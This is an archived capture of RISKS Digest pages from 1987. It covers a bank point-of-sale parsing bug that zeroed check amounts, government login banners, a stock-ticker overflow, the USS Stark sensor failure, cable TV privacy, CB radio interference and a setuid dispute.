the bank's customers (a cadre of retailers to whom the bank sold POS services)
to the credit card networks and back again with authorization numbers.  Our
job as installers was to write the drivers for the specific credit-company
network protocols and define some routing algorithms.  Timing, logging, report
generation and other services were already in the base system.

I learned all sorts of interesting things about the use of credit cards from
the bank's standpoint.  From simple items like checksum algorithms or number
assignments (VISA card numbers all start with 4, Master Card with 5, AMEX with
37, etc.) to oddities of the business, like the loud emergency alarms which go
off in the card company machine rooms when the synchronous network signals
failed.  Thick books detailed the protocols.

I also learned something I had not known to that point: Banks are not one
entity.  Each bank is really a collection of competing fiefdoms, whose arena
of competition is both physical and financial and whose competitors are bank
Vice Presidents.  Bank Vice Presidents may adequately be characterized by two
of their criteria for new computer systems: 1. It must fit in an area which
the responsible VP "owns" and 2. It must be as incompatible as possible with
other systems currently in use within the entire bank.  I considered this
revelation an answer to the question of why so many small, unusual computer
companies can keep making a profit.  To the bank VP mentality standardization
is just a way of losing control of the barony, the land and the serfs.

As part of the POS package, and since I was responsible for the credit card
company protocols, I had to deal with Telecredit.  Telecredit assumes the
financial responsibility in cashing a customer's check, for a price.

The retailer types in your driver's license number, the issuing state, your
name, and the amount of the check.  A packet containing the typed data is
massaged by the POS terminal driver into "standard internal" format and is
sent to the Telecredit driver for transmission.  The driver formats the data
into a packet and ships it to Telecredit.  Telecredit sends back an OK or
failure, which is reformatted and displayed on the originating POS terminal.
(I am simplifying.  There were also error conditions and some subtle failures.
A card company may return codes like "Keep the card."  We were asked to filter
this response, since it was originally intended for ATM's, not some poor clerk
at a POS asked to take Arnold Schwarzenegger's card away from him.  A friend
who works with these POS terminals tells me:

	"Keep the card" is definitely meant for retail personnel, who are
	often instructed to retain a credit card and return it to the card
	company, who promptly issues a check made out in the name of the clerk
	(for hazardous duty :-).  This happened to me a couple of times.  I
	made $25 each time.  In each case, the customer shrugged and handed me
	another piece of plastic.)

I tried to find out how Telecredit works, but the surliness of the Telecredit
people was amazing.  ("We're not about to tell you our business!")  It was not
difficult to envision how it works, though nothing was ever verified.  An OK
from Telecredit means that Telecredit will assume the financial risk in
cashing the check.  It is a service purchased by the bank.  My guess is that
unlike credit card companies, which expect transaction data to come from cards
provided at your request, Telecredit maintains a large database of data
collected only by interaction with the public.

Some time ago, they started with an empty database.  Using statistical data
collected from friendly banks (who don't usually publish such things) on the
number of bad checks passed, they gamble on license numbers for which they
have no track record.  After the first gamble, they have a track record for
that individual, positive or negative.  From then on they make better and
better guesses based both on individual and statistical analyses of their own
database. (Which is probably more accurate than one thinks, considering that
the data it collects is biased for "those who will put up with a Telecredit
check".)  One thing I could not determine was whether they absorbed other
databases containing data supposedly indicative of financial reliability, like
the standard credit references one can obtain on request.

More from my retailing friend:
	When we (at my store) were deciding whether to become a Telecredit
	customer, they were willing to tell us quite a lot about how they
	worked.  Generally your guess is correct.  They do work as you
	describe, except that what I was told is simpler than your reverse
	engineering.  They told us that any customer was considered innocent
	until proven guilty once.  A bad check (they covered these if they
	approved them; for us, it was a form of insurance) was good for 90
	days on their "bad-check passer" list.  They also told us they were
	independent of anyone else's data.

One day, I was approached by my manager (not a bank employee) and asked to
look at the Telecredit transaction log, not normally part of my job.  The
printout was five feet tall.  The manager smiled, thumbed through one stack
and said, "You don't have to look hard to see what I'd like you to see."  As
he thumbed through the reports, labeled "Telecredit Transactions -- &lt;date&gt;
--", the column containing the check amount twinkled slightly in the last two
digits, but to the left of the decimal point, there was nothing, a blank.  We
kept looking.

Every transaction was for less than a dollar, all 160,000 of them.  The vast
majority were exactly zero.  And every transaction was OK'd by Telecredit.

You'd think that something in the software at Telecredit might catch this.  I
thought so too, until it was explained to me that it was common for retailers
to run a "$0.00" transaction simply to see if the driver's license was valid.
A certain misuse of the system.  An OK didn't mean the driver's license was
OK, it meant Telecredit had no current negative record for the license.

Many of the transactions were for large sums, as the bank found out when the
retailers deposited them.  Since the "bank's" software had taken valid check
amounts varying from zero to tens of thousands of dollars and had truncated
the dollar figure from every transaction, it was not Telecredit's fault.  I
believe (though I could not verify) that the bank lost hundreds of thousands
of dollars.

The reaction of the Bank officer was surreal, at least to someone like me, who
uses scientific notation for anything over a thousand.  They decided that it
was worth more to the bank not to withdraw the service, even temporarily, than
it cost them in bad authorizations.  So we were ordered to fix it live.

I found the bug in the POS terminal driver.  Some programmer I'd never hire
had tried to make a two pass loop out of an "ascii-to-integer" function and
zeroed the register within the loop.  It set a register to zero, parsed the
dollars, set the same register to zero and parsed the cents.  The register
then held binary cents.  I figured out a two instruction patch to the running
system and patched it live, made the corresponding change to the source,
compiled and installed it so the next restart would get the new code.

I think this illustrates many different computer risks:

1. One of my favorite computer risks involves the assignment of special
   human-oriented meanings to "zero" which are not fully accessible to the
   computer's understanding. (If you'll allow this loose usage of
   "understanding" as a synonym for "programming".)

   In different instances, Zero may mean:

	Uninitialized	False		Error		OK	Empty
	End-of-Line	Balanced	Neutral		Test	Waiting
	etc.

   Here it meant "test", but it was also an "error".

2. Telecredit is another group collecting cross-reference data on us.  Like
   monitoring mail systems to get "known associates" lists.

3. The bank already had POS software, at least two different versions.
   The policy of internal competition and the maintenance of separate
   fiefdoms inside the bank creates a chaotic environment which knowledgeable
   persons may exploit.  And have.

4. "What about testing?" you may ask.  We did test.  We tested a lot.  The
   software at fault was unchanged from the base system, one of the few things
   we took for granted, since it had been installed in at least 10 other sites
   across the country.  The teams working on the other sites had never noticed
   this.  I was not told why.  It is possible that we were guinea pigs, or
   the software was sabotaged.  (I know it sounds paranoid, but in that
   environment it was plausible.  I left the consultant/contractor world from
   this experience, miserable in many respects.)

5. Our money is managed by people who care nothing for the details of
   an single transaction.  They sell financial services like the grocer
   sells apples.  So what if a few are dropped on the floor?  It's just a
   "cost of doing business."  As the throughput of transactions increases over
   time, each detail gets commensurately smaller.  It can only get worse.

David G. Grubbs, Cognition Inc., 900 Tech Park Drive, Billerica, MA 01821
UUCP: ...!{mit-eddie,talcott,necntc}!dandelion!dgg	
Internet: dgg@dandelion.ci.com	                           (617) 667-4800

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: more on computer security
</A>
</H3>
<address>
John Pershing 
&lt;<A HREF="mailto:PERSHNG@ibm.com">
PERSHNG@ibm.com
</A>&gt;
</address>
<i>
17 November 1987, 10:35:23 EST
</i><PRE>
Date: 17 Nov 87 11:27:33 PST (Tue)
From: [..., at contributor's request]

Some recent security developments at my site (and others) are starting
to cause complaints.  Where military and some civilian sites have these
requirements pro forma, people have a greater feeling of doing work
in the public interest.  Recent fears of system crackers entering, reading
privacy data, potentially modifying any data, puts the Government
in an awkard position between police state and protector of public
interest.

This makes working in networked environments even more interesting.
A sample login session now appears as follows:
 
Welcome To [. . . that single word is part of the problem . . .]

[. . . this part of session removed . . .]
 
You are connected to a U.S. Government computer system.  Any unauthorized
ATTEMPT to gain access to this system may subject you to fine and/or
imprisonment.
 
Username: [. . .this part of session removed . . .]
Password:
 
        NOTICE:  This system does not provide access control
        protection sufficient for the storage, processing,
        or communication of classified, highly sensitive, or
        proprietary information.  Protection of other sensitive
        information is a USER RESPONSIBILITY.
&lt;End-of-session&gt;

We are just now getting complaints because of words like "imprisonment."
The justification for this coming from DOJ was that: "If you have a `fence'
that delimits property, don't come to us if you don't have warning signs
[space as such and such a distance and such and such a size.  We can't
prosecute."  Some of our users are using words similar to a recent net
posting mentioning Draconian police states, and hence, are thinking of going
to the ACLU.  These warnings are currently restricted to certain types of
systems, but technology changes potentially worsen the problem: networks
(from which they are threatening to disconnect totally), workstations and
personal computers, and so forth.

The text comes from Washington DC.  Middle management does not feel it can
explain all of the justification since the material comes from a document
under the new Sensitive classification.  They feel it was done with a bad PR
job.  But they also realize that Congressmen control overall spending: i.e.,
not responsible for Government property (computing), hence, take it away.

I am curious what other scientific sites are doing in similar ways.
Please skip the obvious (secure computers aren't on networks, or passwords
or encryption).  We are talking civil liberties as part of this discussion.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.60.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.62.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-14</DOCNO>
<DOCOLDNO>IA012-000130-B022-138</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.62.html 128.240.150.127 19970217014228 text/html 30705
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:40:53 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 62</TITLE>
<LINK REL="Prev" HREF="/Risks/5.61.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.63.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.61.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.63.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 62</H1>
<H2> Friday, 20 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
A Two-Digit Stock Ticker in a Three-Digit World 
</A>
<DD>
<A HREF="#subj1.1">
Chuck Weinstock
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Stark - warning depends on operator action, intelligence data quality    
</A>
<DD>
<A HREF="#subj2.1">
Jonathan Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Task Force Slams DoD for Bungling Military Software 
</A>
<DD>
<A HREF="#subj3.1">
Jonathan Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Addressable CATV 
</A>
<DD>
<A HREF="#subj4.1">
Jerome H. Saltzer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Human automata and inhuman automata 
</A>
<DD>
<A HREF="#subj5.1">
Chris Rusbridge
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: CB frequencies and power 
</A>
<DD>
<A HREF="#subj6.1">
Dan Franklin
</A><br>
<A HREF="#subj6.2">
 John McLeod
</A><br>
<A HREF="#subj6.3">
 Wm Brown III
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  "UNIX setuid stupidity" 
</A>
<DD>
<A HREF="#subj7.1">
David Phillip Oster
</A><br>
<A HREF="#subj7.2">
 Stephen Russell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Software Safety Specification 
</A>
<DD>
<A HREF="#subj8.1">
Mike Brown
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Call for Papers, COMPASS '88 
</A>
<DD>
<A HREF="#subj9.1">
Frank Houston
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  "Normal Accidents" revisited 
</A>
<DD>
<A HREF="#subj10.1">
David Chase
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Space Shuttle Whistle-Blowers Sound Alarm Again 
</A>
<DD>
<A HREF="#subj11.1">
rdicamil
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
A Two-Digit Stock Ticker in a Three-Digit World
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Fri, 20 Nov 87 17:06:42 EST
From: Chuck Weinstock &lt;weinstoc@SEI.CMU.EDU&gt;

From Business Week, November 30, 1987, Page 108I
(Industrial/Technology Edition):

When the Dow Jones industrial average plunged 508 points on Oct. 19, the
message didn't get through to subscribers of Lotus Development Corp.'s
Signal service, which provides up-to-the-minute market data.  Because Signal
can record only a two-digit net change for each day, it reduced the market
crash to eight points.  "When the product was originally designed, they
didn't take into account these sorts of fluctuations," concedes Lotus
spokesman James P. O'Donnell.

Signal, introduced two years ago, captures stock prices and indexes from an
FM radio wave, then displays them in a Lotus 1-2-3 spreadsheet format.
Lotus says it won't fix the problem until the next release of Signal, and it
won't say when that will be.  Until then, Signal subscribers, who pay at
least $100 a month for transmissions, will have to check that third digit --
or fourth -- in the next morning's paper.

      [Sounds like Signal has been Short-Sheeted.  As the Father of the
      spreadsheet, maybe with Signal Lotus Leaves something to be de-Sired?
      (I suspect they do not anticipate another 100-point swing soon.  Dow-dy?)
      Which digit is the Index finger?  1st in US, 2nd in Europe, 4th if you
      turn the right hand over.  But having to check the fourth digit in
      the Dow-swing sounds really ominous!  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Stark - warning depends on operator action, intelligence data quality
</A>
</H3>
<address>
Jonathan Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 19 Nov 87 09:10:41 PST
Organization:  University of Washington

The STARK's captain told the press some time ago that he thought the ship's
warning system had not worked.  It turns out the warning system is dependent 
on the quality of data loaded by operators.  This information comes from
John A. Adam, "USS STARK: what really happened?", IEEE SPECTRUM, Sept. 1987,
26 - 29.  Some excerpts:

  Brindel, who had been the Stark's captain, said during a telephone interview
  on Aug. 5: "If the sensors that we had would have divulged the things they
  should have, then I'm sure my TAO (referring to tactical action officer 
  Moncrief) would have taken additional measures." Brindel said neither the
  radars nor early warning receiver performed according to specifications.  But
  he declined to elaborate, saying, "I think all the problems are being 
  addressed by the Navy."

  Sources familiar with the Naval Board of Inquiry investigation have confirmed
  a statement by Brindel to SPECTRUM: the SLQ-32 radar receiver did detect the
  missiles coming but it failed to properly identify them. This is reminiscent 
  of the (attack on the Sheffield in the 1982 Falklands War...) ...

  The SLQ-32 computer compares the observed signal characteristics with the 
  parameters of possible radar emitters stored in the computer's library of
  friendly and hostile targets.  When identification is complete, the computer
  sends it to the display to alert the operator.

  ...Identification as friend or foe can be "heavily influenced by the SLQ-32
  operator" using software libraries.  Some libraries, such as those for Soviet
  equipment, are fixed and cannot be tampered with; others, such as those for
  weaponry of US forces or Third World nations, are variable, allowing inputs
  from the operator when the ship is deployed in a given territory.  
  One source familiar with the operations said the US military uses an
  "electronic order of battle" which lists all anticipated friendly,
  neutral, and hostile emitters.  This, he said, would be the basis for
  SLQ-32 entries for a specific operation or region.

  Thomas F. Curry, associate deputy assistant secretary for the Navy until
  1983, said "it's probably more difficult to get intelligence information
  on friendly neutrals (like France or Iraq) than on hostile countries." ...
  Friendly neutral countries do not freely give information on their weapons
  to allies, since it would hurt military export sales.  The US Navy had
  (conducted tests on some Exocets but) the Exocet's Paris-based manufacturer,
  Aerospatiale, refused to say whether it had recently changed the
  characteristics of the missile's seeker.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
"Task Force Slams DoD for Bungling Military Software" (SDI, Ada, ...)
</A>
</H3>
<address>
Jonathan Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Wed, 18 Nov 87 21:30:43 PST
Organization: University of Washington

Task Force Slams DoD for Bungling Military Software Efforts
ELECTRONICS, Nov. 12, 1987, p. 121.

The Defense Department's efforts in sofware development are disjointed,
uncoordinated, and lack support, charges the Defense Science Board's Task
Force on Military Software.  The task force reports "it is convinced that
today's major problems with military software are not technical, but
management problems."  It lambastes the DOD for having "not provided the
vital leadership needed" in Stars, the Software Technology for Adaptable,
Reliable Systems.  It complains that Ada, the high-level programming
language the DOD is pushing to make a standard for all military systems "has
been overpromised."  It warns that "the Strategic Defense Initiative has a
monumental software problem" and that "no program to address the software
problem is evident."  To solve the management problem, the task force urges
the DOD to bring together Stars, Ada, and the Software Engineering Institute
under the Air Force Electronic Systems Division.  It also wants
representatives from the three programs and from the Defense Advanced
Research Projects Agency's Strategic Computing Initiative to produce a
"one-time jont plan to demonstrate a coordinated DOD Software Technology
Program."  What does the DOD have to say?  Not much just yet.  Officials at
the Ada Program office did not respond to calls, and a DARPA spokesman would
say only that the agency "has no plans to implement any of the changes the
report recommends" at this point but will take them under consideration.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Addressable CATV (<A HREF="/Risks/5.61.html">RISKS-5.61</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
Fri, 20 Nov 87 02:10:17 EST
</i><PRE>
From: Jerome H. Saltzer &lt;Saltzer@ATHENA.MIT.EDU&gt;

Allan Pratt raises several good questions about privacy vis-a-vis
addressable CATV technology, with the following starting point:

&gt; The cable company serving the community where I live is upgrading
&gt; their service to new, addressable converter boxes.

It turns out that the term "addressable" in the CATV industry almost
always means "one-way addressable".

One-way addressable is moderately harmless to privacy--it really means only
that the converter box responds to signals specifically addressed to it
(such as "allow this customer to watch Showtime").  In a one-way addressable
system there isn't a return path from the converter back to the head-end, so
the company has no way of knowing whether or not the box responded, how many
movies you have watched on the Playboy channel, or whether or not you have
used the "mute" feature.  The only things the company knows are what
channels it tried to authorize, how promptly you pay your bills, and how
often you complain about the service.  There is still a good privacy issue,
because their computer can easily generate for sale a mailing list, e.g., of
everyone who subscribes to one of the premium sports channels.  In our
community, the CATV operator sends a yearly notice to each subscriber
promising not to use CATV billing information for anything other than billing.

Although the FCC has for several years been requiring that new CATV systems
be two-way capable, almost none of them actually implement the capability,
because the technology is some distance over the edge of what the average
CATV operator can keep running.

An operator probably wouldn't go to the trouble of shaping up his or her
plant for two-way unless a big revenue stream is in prospect.  The only
revenue stream currently in prospect is pay-per-view.  Two-way pay-per-view
systems can be easily identified: if you can agree to pay for a pay-per-view
event simply by pushing buttons on the converter box, it is two-way, and you
should worry a lot about the problems that Pratt raises.  If you have to
call the cable company on the phone to "order" the pay-per-view event, they
are using a one-way system, and you have some control over what they can know.

Last I heard a count there were perhaps twenty cable companies in the
country running two-way, and the number was declining.  Warner in Columbus,
Ohio (under the name QUBE) is the most well-known.
                         				    Jerry

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Human automata and inhuman automata
</A>
</H3>
<address>
Chris Rusbridge 
&lt;<A HREF="mailto:munnari!max.sait.oz.au!cccar@uunet.UU.NET">
munnari!max.sait.oz.au!cccar@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 18 Nov 87 10:00:14 cst
</i><PRE>

There was a radio news item this morning about a Canberra company who 
received a Telecom bill over 2,000 pages long. Most of the pages 
contained zero items, so I don't think they were complaining about the 
bottom line. However the bill was a stack of paper over 450mm high!

Of course, changes to Telecom's billing computer system were blamed for the
debacle, which I think reached Parliament. The RISK illustrated here, above
the common failures to test changes in production systems properly, is the
human automaton who wrapped that stack of paper up in a parcel and sent it
off, apparently without checking or reporting it. What kind of *human*
system have they designed in there?

Chris Rusbridge, Academic Computing Service Manager
S. A. Institute of Technology
ACSnet: cccar@max.sait.oz 
Phone:  +61 8 343 3098  Fax +61 8 349 6939  Telex: AA82565
Post:   The Levels, SA 5095 Australia

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: CB frequencies and power 
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 19 Nov 87 10:24:52 -0500
From: dan@WILMA.BBN.COM

&gt; CB's run at 4 Watts.  Their wavelength is 436 inches.  (~11m).
&gt; JOHN MCLEOD    Georgia Insitute of Technology, Atlanta Georgia

4 watts is the legal limit (power to antenna, as I recall), but when
I was an amateur radio operator, it was common knowledge that CB'ers
often flouted the law.  They'd buy a ham amplifier for 10 meters and
use it for 11 meters.  They'd get 100-1000 watts that way (1kw being
the legal ham limit).  In cars, even.

So despite the low legal power limit on CB transmissions, it would not
surprise me to hear of computer (and other) problems being caused by CB
radios at a considerable distance.
                                	Dan Franklin

</PRE>
<HR><H3><A NAME="subj6.2">
Re: CB frequencies and power
</A>
</H3>
<address>
John McLeod
&lt;<A HREF="mailto:jm7@pyr.gatech.edu ">
jm7@pyr.gatech.edu 
</A>&gt;
</address>
<i>
Thu, 19 Nov 87 15:28:59 EST
</i><PRE>
Cc: RISKS@kl.sri.com

This is true, however, after a few people got caught and had to pay 
$10,000 and up fines for running large amplifiers, a large number of 
those breaking the law stopped.  More recently, however, there
has been no enforcement at all on CB channels.

</PRE>
<HR><H3><A NAME="subj6.3">
CB frequencies and power (<A HREF="/Risks/5.60.html">RISKS-5.60</A>)
</A>
</H3>
<address>
Wm Brown III 
&lt;<A HREF="mailto:Brown@GODZILLA.SCH.Symbolics.COM">
Brown@GODZILLA.SCH.Symbolics.COM
</A>&gt;
</address>
<i>
Thu, 19 Nov 87 14:19 PST
</i><PRE>
To: RISKS@csl.sri.com

    CB's run at 4 Watts.  Their wavelength is 436 inches.  (~11m).

That's the theory.  In practice, however, *MANY* CB operators run bootleg
power amplifiers which put out tens, hundreds, or sometimes thousands of
watts.  When computer-controlled engines started showing up on our roads, 
some truckers actually made a game of stalling them out by keying up CB
transmitters nearby.  Points were scored according to the performance/price
class of the vehicles disabled and the degree of panic induced by engine
failure at 65 MPH.  VW drivers who wouldn't let an 18-wheeler pass them
were targets for more serious electronic warfare -- it wasn't the trucker's
fault that the VW stalled two car lengths in front of him....

The FCC has very few enforcement agents, and has pretty much given up any 
pretense of controlling the 27 MHz band.  In some areas, owners of very
high-powered transmitters establish 'ownership' of a CB channel by simply
blasting everyone else off the air.  An account of one Blackhawk crash
laid the blame to a nearby 'bootleg CB transmitter,' which I interperted
to mean one of these power mongers.  The term "Alligator" has been coined
to describe radios with "Big mouths and tiny ears."

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: "UNIX setuid stupidity"
</A>
</H3>
<address>
David Phillip Oster
&lt;<A HREF="mailto:oster%SOE.Berkeley.EDU@jade.berkeley.edu ">
oster%SOE.Berkeley.EDU@jade.berkeley.edu 
</A>&gt;
</address>
<i>
Wed, 18 Nov 87 08:14:33 PST
</i><PRE>

Thank you for the correction. The setgid solution is much better than the
one I proposed. i didn't hit upon it because your solution does not solve
the problem _as stated_ (Student creates a copy in the teacher's directory
that no othe student can read.) Although it solves the more general 
problem.  A still simpler solution: mail the assignment to the teacher.

--- David Phillip Oster            --A Sun 3/60 makes a poor Macintosh II.
Arpa: oster@dewey.soe.berkeley.edu --A Macintosh II makes a poor Sun 3/60.
Uucp: {uwvax,decvax,ihnp4}!ucbvax!oster%dewey.soe.berkeley.edu

</PRE>
<HR><H3><A NAME="subj7.2">
 "UNIX setuid stupidity" (<A HREF="/Risks/5.57.html">RISKS-5.57</A>)
</A>
</H3>
<address>
Stephen Russell
&lt;<A HREF="mailto:munnari!basser.cs.su.oz.au!steve@uunet.UU.NET ">
munnari!basser.cs.su.oz.au!steve@uunet.UU.NET 
</A>&gt;
</address>
<i>
19 Nov 87 10:54:10 GMT
</i><PRE>
Organization: Dept of Comp Sci, Uni of Sydney, Australia

In RISKS 5.57, David Oster makes the mistake of assuming that, as I reported
the error concerning inappropriate use of a setuid root program, that I was
responsible for it. In fact, the error was made by a member of the teaching
staff (since left here) several years ago. While the member of staff
probably should have known better, his attempts at making the program secure
were naive. What is more worrying is that the program must have been
installed by a system administrator, who certainly should have known better.
This raises the interesting question of who is responsible for this security
bug - the person who wrote the buggy program, or the programmer who
installed it without vetting it?

(As an aside, Mr Oster's defamatory statements, accusing me of stupidity,
illustrate how the immediacy of electronic mail tempt us to make comments which
we would think twice about if actually face to face. Another computer risk?).

   [I have omitted some of David's message, and ten or so additional
   messages on setuid/getuid.  Most of them focused rather too narrowly
   on specific partial implementations, but missed the bigger picture.
   By the way, I do not normally run messages with personal implications, 
   but this one seemed appropriate to clear the air.  I imagine in this
   case one party may have been less than objective and the other may
   have been overly defensive.  At any rate, the debate is deemed ended.  PGN]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Software Safety Specification
</A>
</H3>
<address>
&lt;<A HREF="mailto:mlbrown@nswc-wo.ARPA">
mlbrown@nswc-wo.ARPA
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 16:19:26 est
</i><PRE>

I am in the process of writing a draft MIL-SPEC for Software Systems Safety
(MIL-SPEC-SWS).  It is based on MIL-STD-SNS (draft) and will address the
300 series tasks from MIL-STD-882B and parallel the DoD-STD-2167 software
development process.  I am looking for suggestions for materials or subjects
that should be included in the SPEC.  Analysis techniques, specific topical
areas that should be covered, etc.  I would welcome any material that the
RISKS readers would care to contribute.  MIL-SPEC-SWS will be more of a 
how-to and guidelines document than a policy and what-to document.  You
can e-mail to me directly at mlbrown@nswc-wo.arpa or by conventional mail
		Commander, Naval Surface Warfare Center
		Code: H12 (M. Brown)
		Dahlgren, VA  22448-5000
                        			Thanks,		Mike Brown

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Call for Papers, COMPASS '88
</A>
</H3>
<address>
Frank Houston
&lt;<A HREF="mailto:houston@nrl-csr.arpa ">
houston@nrl-csr.arpa 
</A>&gt;
</address>
<i>
Thu, 19 Nov 87 09:22:48 est
</i><PRE>

                               CALL FOR PAPERS

                                 COMPASS '88
                 (Third Annual Computer Assurance Conference)

 *   A man with cancer is killed because a computer tells a radiation
     therapy machine to administer a lethal dose.

 *   A rocket on the way to Mars has to be destroyed because a crucial
     line is left out of the computer software controlling it.

 *   A bank is forced to borrow $23.6 billion overnight because of a
     computer, and the government-securities market narrowly escapes
     disaster.

 *   Workers are killed by computer controlled industrial robots.
 
All of these disasters have happened, and their numbers are increasing year
by year.  COMPASS is an organization dedicated to finding ways of
combatting this problem, and increasing Computer Assurance.  The name
"COMPASS" combines abbreviations of "COMPuter" and "ASSurance".

What do we mean by computer assurance?

One might define the term analytically by including process security,
systems safety, software safety, reliability, quality control, testing,
verification and validation, mathematics, physics, and various engineering
disciplines.  It is not, however, a simple combination of these.  On the
one hand, a system may be totally unreliable yet perfectly safe; on the
other hand, a safe system may sometimes not be an appropriate goal.
Furthermore, there are deep, unresolved philosophical questions about both
immediate design goals of autonomous systems and more universal meta-goals
apropos of dealing with the unexpected.  What should these goals be and how
do the design goals and the meta-goals interact?

Help us explore computer assurance, define its boundaries, identify its
issues, and realize its objectives.  Submit an article or abstract for the
1988 conference.

Abstracts of any length will be considered; complete papers are preferred.
All submissions should be typed double spaced and single sided (draft
form).  Upon acceptance, IEEE kits for preparing camera ready copy will be
sent.

   ====================================================================
                                     *                                     
   Dates:  27 June -- 1 July '88     *  Mail manuscripts, abstracts and    
                                     *  requests for information to:      
    Location:  Washington, D.C.      *
         ---------------             *
General Chair: CDR Micheal Gehl, ONR *           COMPASS '88
                                     *          P.O. Box 5314
  Program Chair: Janet Dunham, RTI   *       Rockville, MD 20851
         ---------------             *
   Submissions due:  30 Jan 1988     *  ( ) Submission  ( ) Information
                                     *
   ====================================================================

Submit abstracts electronically to Janet Dunham (jrd@rti.rti.org).
